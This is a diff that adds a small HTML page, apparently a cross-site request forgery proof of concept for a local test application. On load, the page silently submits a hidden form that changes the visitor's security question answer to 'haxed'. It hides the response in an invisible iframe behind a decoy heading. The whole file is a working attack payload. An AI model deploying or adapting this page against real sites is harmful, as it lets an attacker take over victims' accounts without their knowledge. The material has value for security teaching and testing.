@@ -1,0 +1,13 @@
+<html>
+<head></head>
+<body onload="document.forms.hidden_form.submit.click();">
+	<h1>Nothing interesting to see here...</h1>
+	<form name="hidden_form" method="POST" target="hidden_frame" action="http://localhost/change-security-question_action.php">
+		<input type="hidden" name="security_question" value="What was the name of your first pet?" />
+		<input type="hidden" name="answer" value="haxed" />
+		<input type="submit" style="display:none;" name="submit" value="Save" />
+	</form>
+	<iframe style="display:none;" name="hidden_frame"></iframe>
+</body>
+
+</html>
